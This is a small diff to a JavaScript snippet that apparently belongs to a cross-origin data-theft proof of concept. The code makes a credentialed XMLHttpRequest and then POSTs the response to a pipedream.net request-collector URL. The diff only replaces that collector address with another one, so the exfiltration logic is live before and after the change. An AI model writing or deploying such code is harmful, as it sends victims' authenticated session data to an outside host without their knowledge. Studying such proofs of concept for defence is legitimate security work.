@@ -6,7 +6,7 @@ xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
 	if (xhr.readyState == 4) {
 		var http = new XMLHttpRequest();
-		var url = "https://eo5z77yd16sjy2y.m.pipedream.net";
+		var url = "https://en3ssg27t0zsn.x.pipedream.net/meme";
 		http.open("POST", url, true);
 		http.setRequestHeader("Content-type", "text/plain");
 		http.onreadystatechange = function() {
